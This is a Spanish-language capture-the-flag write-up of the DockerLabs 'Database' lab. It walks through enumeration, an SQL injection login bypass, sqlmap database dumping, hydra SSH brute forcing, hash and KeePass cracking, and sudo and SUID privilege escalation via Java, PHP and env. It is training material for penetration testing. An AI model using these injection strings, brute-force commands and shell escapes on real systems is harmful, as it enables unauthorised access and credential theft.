---
title: DockerLabs - Database
summary: "Write-up del laboratorio Database de DockerLabs"
author: elcybercurioso
date: 2026-02-03 12:53:48
categories: [Post, DockerLabs]
tags: [medio, sqli, smb, brute force, ssh, credentials leaking, sudo, java, keepass, php, env]
media_subpath: "/assets/img/posts/dockerlabs_database"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ nmap -sCV -p22,80,139,445 172.17.0.2
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Iniciar Sesi\xC3\xB3n
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
Host script results:
| smb2-time: 
|   date: XXXX-XX-XXTXX:XX:XX
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

## análisis

Comenzamos accediendo a la página web que hay desplegada en el puerto 80 de la máquina:

![Desktop View](/20260122131412.webp){: width="972" height="589" .shadow}

Mientras analizamos la web, dejaremos **gobuster** corriendo en segundo plano buscando recursos en el servidor empleando fuerza bruta, pero no encontramos nada relevante:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt            
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2921]
/config.php           (Status: 200) [Size: 0]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Tratamos de ver si el panel es vulnerable a inyecciones SQL empleando payloads básicos:

![Desktop View](/20260122131836.webp){: width="600" height="420" .shadow}

Y vemos que con la siguiente cadena accedemos sin problema:

```bash
admin' or 1=1;-- -
```

![Desktop View](/20260122131805.webp){: width="972" height="589" .shadow}

Después de analizar la página a la que accedemos tras saltarnos el panel de autenticación, no vemos nada más, por lo que seguiremos analizando la máquina.

En el análisis de `nmap` vimos que el servicio de SMB está desplegado, por lo que trataremos de obtener más información con **crackmapexec** (o **nxc**, que es la nueva versión, ya que el proyecto de **crackmapexec** ha dejado de recibir actualizaciones):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ crackmapexec smb 172.17.0.2
SMB         172.17.0.2      445    3EEA2836F91C     [*] Windows 6.1 Build 0 (name:3EEA2836F91C) (domain:3EEA2836F91C) (signing:False) (SMBv1:False)
```

Emplearemos también **enum4linux** para listar más información de SMB, y veremos que nos descubre varios usuarios más:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ enum4linux -a 172.17.0.2                               
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )

 =========================================( Target Information )=========================================

Target ........... 172.17.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ========================================( Users on 172.17.0.2 )========================================

index: 0x1 RID: 0x3e9 acb: 0x00000010 Account: dylan    Name: dylan     Desc:

user:[dylan] rid:[0x3e9]

 ==================================( Share Enumeration on 172.17.0.2 )==================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shared          Disk      
        IPC$            IPC       IPC Service (3eea2836f91c server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2

//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A
//172.17.0.2/shared     Mapping: DENIED Listing: N/A Writing: N/A

[E] Can`t understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\dylan (Local User)
S-1-22-1-1001 Unix User\augustus (Local User)
S-1-22-1-1002 Unix User\bob (Local User)
```

## acceso inicial (augustus)

### por fuerza bruta

Mientras seguimos revisando la máquina, dejaremos en segundo plano **hydra** tratando de obtener las contraseñas de los usuarios `dylan`, `augustus` y `bob` por SSH empleando fuerza bruta. Casi de inmediato nos encuentra la contraseña del usuario `augustus`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ hydra -l augustus -P /usr/share/seclists/Passwords/rockyou.txt ssh://172.17.0.2 -I
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: augustus   password: ******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
```

Con las credenciales obtenidas, tratamos de conectarnos como el usuario `augustus`, y vemos que ya estamos dentro de la máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ ssh augustus@172.17.0.2      
augustus@172.17.0.2`s password: 
augustus@3eea2836f91c:~$ whoami
augustus
augustus@3eea2836f91c:~$ hostname -I
172.17.0.2
```

### por SQLi 

Otra manera de obtener la contraseña del usuario `augustus` es aprovecharnos de que el panel de autenticación de la página web alojada en el puerto 80 de la máquina víctima es vulnerable a un ataque **SQLi** (SQL Injection), y aprovecharnos de ello para exfiltrar información.

Comenzaremos por interceptar una petición de login con **Burp Suite** (método POST) y la guardamos en un fichero:

![Desktop View](/20260122200401.webp){: width="972" height="589" .shadow}

Ahora ejecutaremos `sqlmap` pasándole esta petición que hemos guardado, la cual nos devolverá las bases de datos existentes:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ sqlmap -r request.txt --batch --dbs                                                            
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
[XX:XX:XX] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[XX:XX:XX] [INFO] fetching database names
[XX:XX:XX] [INFO] resumed: 'information_schema'
[XX:XX:XX] [INFO] resumed: 'mysql'
[XX:XX:XX] [INFO] resumed: 'performance_schema'
[XX:XX:XX] [INFO] resumed: 'sys'
[XX:XX:XX] [INFO] resumed: 'register'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys
```

La base de datos más prometedora sería `register`, por lo que tratamos de obtener las tablas de la misma:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ sqlmap -r request.txt --batch -D register --tables
        ___
       __H__                                                                                                                                                                                      
 ___ ___[']_____ ___ ___  {1.9.9#stable}                                                                                                                                                          
|_ -| . [(]     | .'| . |                                                                                                                                                                         
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                      
...
[XX:XX:XX] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[XX:XX:XX] [INFO] fetching tables for database: 'register'
[XX:XX:XX] [INFO] resumed: 'users'
Database: register
[1 table]
+-------+
| users |
+-------+
```

Ahora buscaremos las columnas de la tabla `users` de la base de datos `register`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ sqlmap -r request.txt --batch -D register -T users --columns
        ___
       __H__                                                                                                                                                                                      
 ___ ___[,]_____ ___ ___  {1.9.9#stable}                                                                                                                                                          
|_ -| . [']     | .'| . |                                                                                                                                                                         
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                      
...
[XX:XX:XX] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[XX:XX:XX] [INFO] fetching columns for table 'users' in database 'register'
[XX:XX:XX] [INFO] resumed: 'username'
[XX:XX:XX] [INFO] resumed: 'varchar(30)'
[XX:XX:XX] [INFO] resumed: 'passwd'
[XX:XX:XX] [INFO] resumed: 'varchar(30)'
Database: register
Table: users
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| passwd   | varchar(30) |
| username | varchar(30) |
+----------+-------------+
```

Teniendo ya las columnas, podemos obtener la información que tiene almacenada ejecutando el siguiente comando:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ sqlmap -r request.txt --batch -D register -T users -C passwd,username --dump
        ___
       __H__                                                                                                                                                                                      
 ___ ___[.]_____ ___ ___  {1.9.9#stable}                                                                                                                                                          
|_ -| . [`]     | .'| . |                                                                                                                                                                         
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                      
....
[XX:XX:XX] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[XX:XX:XX] [INFO] fetching entries of column(s) 'passwd,username' for table 'users' in database 'register'
[XX:XX:XX] [INFO] resumed: '****************'
[XX:XX:XX] [INFO] resumed: 'dylan'
Database: register
Table: users
[1 entry]
+------------------+----------+
| passwd           | username |
+------------------+----------+
| **************** | dylan    |
+------------------+----------+
```

De esta manera, habremos obtenido la contraseña del usuario `dylan`, pero en este caso es la de SMB:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ smbclient \\\\172.17.0.2\\shared -U "dylan%****************"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May 27 08:58:52 2024
  ..                                  D        0  Mon May 27 08:25:46 2024
  augustus.txt                        N       33  Mon May 27 08:58:52 2024

                76798724 blocks of size 1024. 29028192 blocks available
```

Obtenemos el fichero `augustus.txt` que encontramos para analizar su contenido:

```bash
smb: \> get augustus.txt 
getting file \augustus.txt of size 33 as augustus.txt (5.4 KiloBytes/sec) (average 5.4 KiloBytes/sec)
```

Vemos que el nombre es el de uno de los usuarios que nos devolvió el análisis de **enum4linux**, y el contenido parece a primera vista un hash codificado **MD5**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ cat augustus.txt
********************************
```

Si lo analizamos con la herramienta **hashid** no nos aclara que tipo de hash es:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ hashid ********************************
Analyzing '********************************'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

Probamos a pasarlo por [**Crackstation.net**](https://crackstation.net/), la cual nos confirma que es **MD5**, y además nos indica cual es la contraseña en texto claro:

![Desktop View](/20260122190901.webp){: width="972" height="589" .shadow}

La contraseña que nos devuelve es la que podemos emplear para acceder a la máquina como el usuario `augustus` por SSH.

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ ssh augustus@172.17.0.2
augustus@172.17.0.2`s password:
augustus@3eea2836f91c:~$ whoami
augustus
augustus@3eea2836f91c:~$ hostname -I
172.17.0.2
```

Listaremos los usuarios del sistema que tienen una consola asignada en el fichero `/etc/passwd`:

```bash
augustus@3eea2836f91c:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
augustus:x:1001:1001:augustus,,,:/home/augustus:/bin/bash
bob:x:1002:1002:bob,,,:/home/bob:/bin/bash
```

## movimiento lateral (dylan)

En los permisos SUDO del usuario `augustus` encontramos que puede ejecutar **Java** como el usuario `dylan`:

```bash
augustus@3eea2836f91c:~$ sudo -l
[sudo] password for augustus: 
Matching Defaults entries for augustus on 3eea2836f91c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User augustus may run the following commands on 3eea2836f91c:
    (dylan) /usr/bin/java
```

Encontramos en [GTFOBins](https://gtfobins.org/gtfobins/java/#shell) que podemos obtener una consola cuando tengamos permisos SUDO como otro usuario sobre `java`:

![Desktop View](/20260122183029.webp){: width="972" height="589" .shadow}

Para poder conseguir la consola como el usuario `dylan` debemos primeramente movernos a una carpeta que este usuario pueda acceder, como por ejemplo `/tmp`, y una vez dentro ya podremos seguir los pasos que nos indican (se modifica ligeramente el programa de Java para obtener una consola Bash en vez de una `sh`, y también se adapta el comando SUDO a nuestra casuística):

```bash
augustus@3eea2836f91c:~$ cd /tmp
augustus@3eea2836f91c:/tmp$ cat >Shell.java <<EOF
public class Shell {
    public static void main(String[] args) throws Exception {
        new ProcessBuilder("/bin/bash").inheritIO().start().waitFor();
    }
}
EOF
augustus@3eea2836f91c:/tmp$ javac Shell.java
augustus@3eea283sudo -u dylan /usr/bin/java -cp . Shell
dylan@3eea2836f91c:/tmp$ whoami
dylan
```

## movimiento lateral (bob)

Al ir a la carpeta personal del usuario `dylan`, encontramos un fichero con extensión `.kdbx`, el cual es empleado por **KeePass** (gestor de contraseñas de código abierto).

Para poder analizarlo, lo transferiremos a nuestra máquina, en mi caso abriendo un servidor HTTP con `python3`:

```bash
dylan@3eea2836f91c:/tmp$ cd /home/dylan
dylan@3eea2836f91c:~$ ls
Database.kdbx
dylan@3eea2836f91c:~$ file Database.kdbx 
Database.kdbx: Keepass password database 2.x KDBX
dylan@3eea2836f91c:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Desde nuestra máquina lo descargaremos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ wget http://172.17.0.2:8080/Database.kdbx                                                                     
--XXXX-XX-XX XX:XX:XX--  http://172.17.0.2:8080/Database.kdbx
Connecting to 172.17.0.2:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2030 (2.0K) [application/octet-stream]
Saving to: ‘Database.kdbx’

Database.kdbx                                    100%[========================================================================================================>]   1.98K  --.-KB/s    in 0s      

XXXX-XX-XX XX:XX:XX (23.4 MB/s) - ‘Database.kdbx’ saved [2030/2030]

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ ls -la Database.kdbx 
-rw-rw-r-- 1 elcybercurioso elcybercurioso 2030 May 27  2024 Database.kdbx
```

Si lo tratamos de abrir con **KeePass** (que en Linux se instala con el siguiente comando: `sudo apt install keepass2`), veremos que nos pide una contraseña, la cual no sabemos todavía cual puede ser:

![Desktop View](/20260122190348.webp){: width="600" height="420" .shadow}

Probamos a ver si la contraseña es la misma que la del usuario `augustus` por SSH, y resulta ser esa:

![Desktop View](/20260122190525.webp){: width="972" height="589" .shadow}

En caso de no tener un conjunto de contraseñas iniciales, podemos generar el hash con la herramienta `keepass2john` y guardarla en un fichero.

Haciendo uso del fichero que acabamos de crear, podríamos tratar de obtener la contraseña empleando fuerza bruta con herramientas como **john** o **hashcat**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ john -w=/usr/share/seclists/Passwords/rockyou.txt hash
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
******           (Database)
Session completed.
```

Dentro de **KeePass**, si copiamos la contraseña del único registro disponible, veremos que lo que obtenemos realmente es un hash:

![Desktop View](/20260122191613.webp){: width="600" height="420" .shadow}

Pasamos el hash por alguna herramienta que nos compare el hash con otros hashes y nos diga si la contraseña ya es conocida, y veremos que se trata de la misma contraseña con la que abrimos el fichero `Database.kdbx`:

![Desktop View](/20260122190901.webp){: width="972" height="589" .shadow}

También podríamos volver a usar **john** o **hashcat** para sacar la contraseña por fuerza bruta tras guardar el hash dentro de un fichero:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Database]
└─$ john -w=/usr/share/seclists/Passwords/rockyou.txt --format=Raw-MD5 hash
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
******           (?)
Session completed.
```

Pero como el hash estaba guardado como si fuera una contraseña, probaremos a ver si realmente el propio hash es la contraseña del usuario `bob`, y así resulta ser:

```bash
dylan@3eea2836f91c:~$ su bob
Password: 
bob@3eea2836f91c:/home/dylan$ whoami
bob
```

## escalada de privilegios (root)

Revisando los permisos SUDO del usuario `bob` veremos que podemos ejecutar PHP con permisos del usuario `root`:

```bash
bob@3eea2836f91c:/home/dylan$ sudo -l
[sudo] password for bob: 
Matching Defaults entries for bob on 3eea2836f91c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on 3eea2836f91c:
    (ALL) /usr/bin/php
```

Consultamos [GTFOBins](https://gtfobins.org/gtfobins/php/#shell) para ver como podemos aprovecharnos de estos permisos, y nos indican que podemos invocar una consola privilegiada empleando el siguiente comando:

![Desktop View](/20260122193647.webp){: width="972" height="589" .shadow}

Antes de ejecutarlo, hacemos algunas modificaciones, como por ejemplo el tipo de consola por una `bash`, y preceder el comando que indican con `sudo`:

```bash
bob@3eea2836f91c:/home/dylan$ sudo php -r 'system("/bin/bash -i");'
root@3eea2836f91c:/home/dylan# whoami
root
```

## (alternativa) escalada de privilegios (root)

Otra manera de escalar privilegios directamente es con el binario `/usr/bin/env`, el cual vemos que tiene permisos **SUID** (permite que se ejecute con los permisos del propietario):

```bash
augustus@3eea2836f91c:~$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/env
/usr/bin/mount
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

En [GTFOBins](https://gtfobins.org/gtfobins/env/#shell) nos indican que podemos obtener una consola de la siguiente manera cuando el binario `env` tenga permisos SUID:

![Desktop View](/20260122194535.webp){: width="972" height="589" .shadow}

Tras ejecutar el comando que mencionan, obtenemos la consola como el usuario `root`:

```bash
augustus@3eea2836f91c:~$ env /bin/bash -p
bash-5.1# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>